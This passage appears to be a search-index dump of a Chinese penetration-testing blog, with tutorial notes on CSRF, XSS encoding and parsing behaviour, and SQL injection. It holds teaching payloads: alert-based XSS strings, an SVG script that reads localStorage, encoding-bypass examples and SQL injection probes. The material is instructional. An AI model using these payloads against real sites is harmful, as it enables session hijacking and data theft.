","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:3:0","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"CSRF 漏洞相关","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/","tags":["常用","渗透测试"],"title":"CSRF漏洞相关","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"CSRF 漏洞相关 ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:0:0","tags":["常用","渗透测试"],"title":"CSRF漏洞相关","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1 定义与原理 CSRF - 跨站请求伪造 ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:0","tags":["常用","渗透测试"],"title":"CSRF漏洞相关","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1.1 cookie 相关 用户登录的数据包： 响应的数据包： 当提交了用户名和密码登录后，在服务器返回的数据包中携带类的 Set -Cookie 字段，该字段就是为当前登录用户设置的 Cookie 的值。 浏览器在接收到这些 Cookie 的值后会将 set-cookie 字段的值存放在浏览器中。 通过修改请求数据包的 Cookie 为管理员的 Cookie，即使不输入密码也可以登录网站后台。 数据包的中 Cookie的值是浏览器从本地存储中取出，并自动填充到数据包中如果攻击者控制了用户浏览器并且窃取了 cookie.浏览器会自动完成 Cookie的填充，目标网站会误认为该数据包就是管理员发送的，会以管理员的权限进行相关的操作。 ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:1","tags":["常用","渗透测试"],"title":"CSRF漏洞相关","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1.2 CSRF 前提：数据包的中 Cookie 的值是浏览器从本地存储中取出，并自动填充到数据包中 攻击者在一定攻击条件下，利用被攻击者的身份向服务器发起请求，服务器可以正常解析并返回结果。 原理：一般来说，攻击者通过伪造用户的浏览器的请求，向访问用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。 发生条件： 攻击者在网站 A 处于登录状态 必需要在网站 A 同浏览器中打开黑客提供的链接 后台身份验证不严格（例如除 Cookie 外无其它验证） ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:2","tags":["常用","渗透测试"],"title":"CSRF漏洞相关","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2 防御 ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:0","tags":["常用","渗透测试"],"title":"CSRF漏洞相关","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2.1 HTTP Referer 限制 站点可以对一些敏感操作限制其 Referer 字段的值，比如某站点转账的时候使用： http://bank.example/withdraw?account=bob\u0026am=1000000\u0026for=Mallory 转账的操作一定是用户登录之后在本站点的页面上操作的，因为可以将 Referer 字段限制为只允许本站点。 ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:1","tags":["常用","渗透测试"],"title":"CSRF漏洞相关","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2.2 Token CSRF 成功的原因在于站点对于用户身份的辨别依赖于 Cookie，因此攻击者可以在不知道用户口令的情况下直接使用用户的 Cookie 来通过安全验证。 在 HTTP 请求中以参数的形式加入一个随机产生的 HTTP Token，服务器接收到用户请求后会验证 Token，如果没有 Token 或者 Token 不正确都会被认为是攻击而直接丢弃 GET 请求： http://url?csrftoken=tokenvalue POST 请求：\u003cinput type=\"hidden\" name=\"csrftoken\" value=\"tokenvalue\"/\u003e 信息 比如攻击者可以在网站发布自己服务器的地址，当普通用户点击了该地址后，由于该站点会在地址后面添加 Token，也就造成了 Token 的泄露。 因此要对站点对内链和外链进行区分，只在内链中添加 Token，对于外链就不添加 Token。 ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:2","tags":["常用","渗透测试"],"title":"CSRF漏洞相关","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"XSS 漏洞相关","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"XSS 漏洞相关 ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:0:0","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1 定义及原理 XSS(跨站脚本攻击)，浏览器将用户输入的内容当做脚本执行，执行了恶意的功能，这种针对用户浏览器的攻击，即跨站脚本攻击 主要分为三个类型： 反射型 存储型 DOM 型 XSS 危害： 盗取 cookie 盗取账户 恶意软件下载 键盘记录 广告引流 ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:0","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2 反射型 XSS ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:0","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2.1 原理 应用程序或 API 包含未经验证和未经转义的用户输入，直接作为 HTML 输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的 HTML 和 JavaScript。 特点：非持久化，必须用户点击带有特定参数的链接才能引起。 影响范围：仅执行脚本的用户。 ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:1","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"3 存储型 XSS ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:0","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"3.1 原理 存储型 XSS 是指应用程序通过 Web 请求获取不可信赖的数据，在未检验数据是否存在 XSS 代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行 XSS 代码，存储型 XSS 可以持续攻击用户。 存储型 XSS 出现位置： 留言板 评论区 用户头像 个性签名 博客 ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:1","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"4 DOM 型 XSS ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:0","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"4.1 原理 4.1.1 DOM DOM 模型用一个逻辑树来表示一个文档，每个分支的终点都是一个节点(node)，每个节点都包含着对象(objects)。DOM 的方法(methods)让你可以用特定方式操作这个树，用这些方法你可以改变文档的结构、样式或者内容。 4.1.2 DOM XSS DOM 型 XSS 其实是一种特殊类型的反射型 XSS，通过 JS 操作 DOM 树动态地输出数据到页面，而不依赖于将数据提交给服务器端，它是基于 DOM 文档对象模型的一种漏洞。 \u003chtml\u003e \u003cbody\u003e \u003cscript\u003e document.write(\"\u003cscript\u003ealert(1)\u003c\\/script\u003e\") \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 4.1.3 示例 首先这是一个 DOM XSS，产生的原因是 JS 代码动态拼接了一个类似这样的代码： $(\"head\").append(\"\u003cmeta\u003e\"+text+\"\u003c/meta\u003e\") 以下面的 POC 为例： 可以看到 div 中的代码是被 HTML 实体编码后的形式，但是最后结果还是会弹窗 原因在于 innerHTML 输入进去的代码是不会被执行的。 比如你按如下代码来动态插入一个DOM节点 \u003c!DOCTYPE html\u003e \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDOM XSS POC\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"demo\"\u003e\u0026lt;script\u0026gt;alert`1`\u0026lt;/script\u0026gt;\u003c/div\u003e \u003cscript src=\"https://libs.baidu.com/jquery/2.1.1/jquery.min.js\"\u003e\u003c/script\u003e \u003cbr\u003e \u003cdiv id=\"test\"\u003e\u003c/div\u003e \u003cscript\u003e document.getElementById(\"test\").innerHTML = document.getElementById(\"demo\").innerHTML + \"\"; \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 会发现 \u003cdiv id=test\u003e 标签不会被执行，但是 jquery 之类的框架会在插入的时候把节点的标签 eval 下，使得它可以执行，因为这个 append() 方法本身就是要让插入的元素执行，有这个需求的。 4.1.4 与反射型 XSS 的异同与危害 同： 都是没有控制好输入，并且把 javascript 脚本输入作为输出插入到 HTML 页面。 异： 反射型 XSS 是经过后端语言后，页面引用后端输出生效。 DOM XSS 是经过 JS 对 DOM 树直接操作后插入到页面。 危害性： 前后端分离，不经过 WAF 的检测。 ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:1","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"5 伪协议与编码绕过 ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:5:0","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"5.1 伪协议 伪协议不同于因特网上所广泛使用的如 http://、https://、ftp:// 在 URL 中使用，用于执行特定的功能 Data 伪协议： data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4= JavaScript 伪协议： javascript::alert(\"1\") ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:5:1","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"5.2 编码绕过 5.2.1 UNICODE 编码 ISO(国际标谁化组织)制定的包括了地球上所有文化所有字母和符号的编码，使用两个字节表示一个字符 Unicode 只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。具体存储由：UTF-8，UTF-16 等实现 5.2.2 浏览器解码 解析一篇 HTML 文档时主要有三个处理过程： HTML 解析并创建 DOM 树，URL 解析和 JavaScript 解析。每个解析器负责解码和解析 HTML 文档中它所对应的部分，且顺序也有所区别。 5.2.3 HTML 解析过程 5.2.3.1 解析过程 HTML 有 5 类元素： 空元素(Void elements)，有 area、base、br、col、command、embed、hr、img、input、keygen、link、meta、param、source、track、wbr 等 原始文本元素(Raw text elements)，有 \u003cscript\u003e 和 \u003cstyle\u003e RCDATA 元素(RCDATA elements)，有 \u003ctextarea\u003e 和 \u003ctitle\u003e 外部元素(Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素 基本元素(Normal elements)，即除了以上 4 种元素以外的元素 五类元素的区别如下： 空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。 原始文本元素，可以容纳文本。 RCDATA 元素，可以容纳文本和字符引用。 外部元素，可以容纳文本、字符引用、CDATA 段、其他元素和注释 基本元素，可以容纳文本、字符引用、其他元素和注释 HTML 解析器以状态机的方式运行，它从文档输入流中消耗字符并根据其转换规则转换到不同的状态。 以如下代码作为示例： \u003chtml\u003e \u003cbody\u003e This is Geekby's blog \u003c/body\u003e \u003c/html\u003e 初始状态为 「Data」State，当遇到 \u003c 字符，状态变为 「Tag open」state，读取一个 a-z 的字符将产生一个开始标签符号，状态相应变为「Tag name」state，一直保持这个状态直到读取到 \u003e，每个字符都附加到这个符号名上，例子中创建的是一个 html 符号。 当读取到 \u003e，当前的符号就完成了，此时，状态回到「Data」state，\u003cbody\u003e 标签重复这一处理过程。此时，html 和 body 标签都识别出来了。现在，回到「Data」State，读取「This is Geekby’s blog」中的每个字符生成一个字符符号。 这样直到遇到 \u003c/body\u003e 中的 \u003c。现在，又回到了「Tag open」，读取下一个字符 /，进入到「Close tag open」，创建一个闭合标签符号，并且状态转移到 「Tag name」state，还是保持这一状态，直到遇到 \u003e。然后，产生一个新的标签符号并回到「Data」State。后面的闭合标签处理过程同上。 信息 HTML 解析器处于数据状态（Data State）、RCDATA 状态（RCDATA State）、属性值状态（Attribute ValueState）时，字符实体会被解码为对应的字符。 示例 \u003cdiv\u003e\u0026#60;img src=x onerror=alert(4)\u0026#62;\u003c/div\u003e \u003c 和 \u003e 被编码为字符实体 \u0026#60; 和 \u0026#62;。 当 HTML 解析器解析完 \u003cdiv\u003e 时，会进入数据状态并发布标签令牌。 接着解析到实体 \u0026#60; 时因为处在数据状态,就会对实体进行解码为 \u003c， 后面的 \u0026#62; 同样道理被解码为 \u003e。 问题 被解码后，img 是否会被解析为 HTML 标签而导致 JS 执行呢？ 因为解析器在使用字符引用后不会转换到标签打开状态（Tag Open State），不进入标签打开状态就不会被发布为 HTML 标签。因此，不会创建新 HTML 标签，只会将其作为数据来处理。 5.2.3.2 几种特殊情况 原始文本元素 在 HTML中，属于 Raw text elements 的标签有两个：script、style。在 Raw text elements 类型标签下的所有内容块都属于该标签。 Raw textelements 类型标签下的所有字符实体编码都不会被 HTML 解码。HTML 解析器解析到 script、style 标签的内容块（数据）部分时，状态会进入 Script Data State，该状态并不在我们前面说的会解码字符实体的三条状态之中。 因此，\u003cscript\u003e\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116\u0026#40;\u0026#57;\u0026#41;\u0026#59\u003c/script\u003e 这样字符实体并不会被解码，也就不会执行 JS。 RCDATA 情况 在 HTML中，属于 RCDATA 的标签有两个：textarea、title。 RCDATA Elements 类型的标签可以包含文本内容和字符实体。 解析器解析到 textarea、title 标签的数据部分时，状态会进入 RCDATA State。 前面我们提到，处于 RCDATA State 状态时，字符实体是会被解析器解码的。 示例 \u003ctextarea\u003e\u0026#60;script\u0026#62;alert(5)\u0026#60;/script\u0026#62;\u003c/textarea\u003e 解析器解析到它们时会进行解码 但是里面的 JS 同样还是不会被执行，原因还是因为解码字符实体状态机不会进入标签打开状态（Tag Open State），因此里面的 \u003cscript\u003e 并不会被解析为 HTML 标签 5.2.4 JavaScript 解析 形如 \\uXXXX 这样的 Unicode 字符转义序列或 Hex 编码是否能被解码需要看情况。 首先，JavaScript 中有三个地方可以出现 Unicode 字符转义序列： 字符串中 Unicode 转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。 例如，\u003cscript\u003ealert(\"\\u0031\\u0030\");\u003c/script\u003e 被编码转义的部分为 10，是字符串，会被正常解码，JS 代码也会被执行。 标识符中 若 Unicode 转义序列存在于标识符中，即变量名（如函数名等…），它会被进行解码。 例如，\u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(10);\u003c/script\u003e 被编码转义的部分为 alert 字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS 代码也会被执行。 控制字符中 若 Unicode 转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。 控制字符即 ‘、\"、() 等。 例如，\u003cscript\u003ealert\\u0028\"xss\");\u003c/script\u003e，( 进行了 Unicode 编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分alert( 。 因此函数的括号之类的控制字符进行 Unicode 转义后是不能被正常解释的。 示例 \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\u003c/script\u003e 被编码部分为 alert(11)。该例子中的 JS 不会被执行，因为控制字符被编码了。 \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)\u003c/script\u003e 被编码部分为 alert 及括号内为 12。该例子中 JS 不会被执行，原因在于括号内被编码的部分不能被正常解释，要么使用 ASCII 数字，要么加 \"\" 或 ' ' 使其变为字符串，作为字符串也只能作为普通字符。 \u003cscript\u003ealert('13\\u0027)\u003c/script\u003e 被编码处为'。该例的 JS 不会执行，因为控制字符被编码了，解码后的 ' 将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有 ' 来结束字符串。 \u003cscript\u003ealert('14\\u000a')\u003c/script\u003e 该例的 JS 会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。 5.2.5 URL 解析 URL 解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。 首先，要注意的是 URL 的协议部分必须为 ASCII 字符，即不能被任何编码，否则 URL 解析器的状态机将进入 No Scheme 状态。 示例 \u003ca href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"\u003e\u003c/a\u003e URL 编码部分的是 javascript:alert(1)。JS 不会被执行，因为作为 Scheme 部分的 javascript 这个字符串被编码，导致 URL 解析器状态机进入 No Scheme 状态。 URL中的 : 也不能被以任何方式编码，否则 URL 解析器的状态机也将进入 No Scheme 状态。 示例 \u003ca href=\"javascript%3aalert(3)\"\u003e\u003c/a\u003e 由于 : 被URL编码为 %3a，导致 URL 状态机进入 No Scheme 状态， JS 代码不能执行。 示例 \u003ca href=\"\u0026#x6a;\u0026#x61;\u0026#","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:5:2","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"6 HTML 5 新特性及相应的安全分析 ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:6:0","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"6.1 SVG SVG 意为可缩放矢量图形，这是一种使用 XML 格式定义图像的方式 SVG 中的 JS \u003c?xml version=\"1.0\" standalone=\"no\"?\u003e \u003csvg width=\"100%\" height=\"100%\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003crect width=\"100\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)\" /\u003e \u003cscript\u003ealert(1)\u003c/script\u003e \u003c/svg\u003e 当访问上面的文件定义的图片时，会弹窗 利用 SVG 进行钓鱼 整体流程 ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:6:1","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"6.2 Web Storage Web Storage 包含两个部分，一部分是 session Storage，另一部分是 localStorage。 sessionStorage：用于本地存储一个会话(session)中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。 localStorage：用户持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。 新的 HTML5 Web 存储 API 使 Web 开发人员可以在用户的计算机上存储大约 5 兆字节的数据(而 Cookie 中仅允许 4KB 的数据)。 利用 SVG 盗取 localStorage \u003c?xml version=\"1.0\" standalone=\"no\"?\u003e \u003csvg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" \u003e \u003crect width=\"100\" height=\"100\" /\u003e \u003cscript\u003e if(localStorage.length) { for(key in localStorage) { if(localStorage.getItem(key)) { console.log(key); console.log(localStorage.getItem(key)); } } } \u003c/script\u003e \u003c/svg\u003e ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:6:2","tags":["常用","渗透测试"],"title":"XSS 漏洞相关","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"SQL注入相关","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"1 数据库相关 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:1:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"1.1 定义 数据库是一个存储数据的仓库， 以一定方式存储在一起、能与多个用户共享、具有尽可能小的冗余度，与应用程序彼此独立的数据集合 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:1:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"1.2 分类 关系型数据库 - SQL 类似表格，表与表之前存在复杂的关系 MySQL、SQLServer 等 非关系型数据库 - NoSQL Key - Value 形式，简化数据库结构、避免冗余。 MangoDB、Redis、memcached ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:1:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"1.3 基本操作 查看数据库 showdatabases(); 使用数据库 useinformation_schema 查看当前使用数据库 selectdatabase(); 查看数据表 showtables(); 查看数据库版本 selectversion(); 使用当前数据库的用户 selectuser(); 查看数据库路径 select@@datadir 查看安装路径 select@@basedir 查看系统类型 select@@version_compile_os ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:1:3","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"1.4 元数据表 - information_schema information_schema 是信息数据库其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的数据类型与访问权限等。对于 Web 渗透过程中用途很大 SCHEMATA 表：提供了当前 MySQL 实例中所有数据库的信息。是 show databases 的结果取之此表。 TABLES 表：提供了关于数据库中的表的信息(包括视图)。 COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。 通过元数据表查询数据表 selecttable_namefrominformation_schema.tableswheretable_schema='test'; 通过元数据表查询数据列 selectcolumn_namefrominformation_schema.columnswheretable_name='table1'; ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:1:4","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"2 SQL 注入定义及类型 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:2:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"2.1 定义 发生于应用程序与数据库层的安全漏洞 网站内部直接发送的 SQL 请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造 SQL 语句，如果用输入的数据被构造成恶意 SQL 代码，Web 应用又未对动态构造的 SQL 语句使用的参数进行审查，则会带来安全风险。 形成原因 用户能够控制传参 SQL 语句中拼接了用户传参的内容 拼接后的 SQL 语句在数据库中执行 总结：用户输入的数据作为代码执行 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:2:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"2.2 分类 布尔型注入 联合查询注入 时间型注入 报错型注入 堆叠注入(多语句查询注入) ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:2:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"3 判断 SQL 注入 问题 判断该访问目标 URL 是否存在 SQL 注入？ 如果存在 SQL 注入，那么属于哪种 SQL 注入？ 判断 SQL 注入后端数据库的类型？ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:3:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"3.1 经典的单引号判断法 http://xxx/text.php?id=1' 如果页面返回错误，则存在 SQL 注入；原因是无论字符型还是整型都会因为单引号个数不匹配而报错。 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:3:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"3.2 判断注入类型 数字型 通常构造 and 1=1 以及 and 1=2 来判断 运算符判断法： 这种判断方法的关键在于通过加、减、乘、除等运算，判断输入参数附近有没有引号包裹，再通过一些通用的攻击手段，获取数据库的敏感信息。 字符型 通常构造 and '1'='1 以及 and '1'='2 来判断 类型转换判断法： 在 MySQL 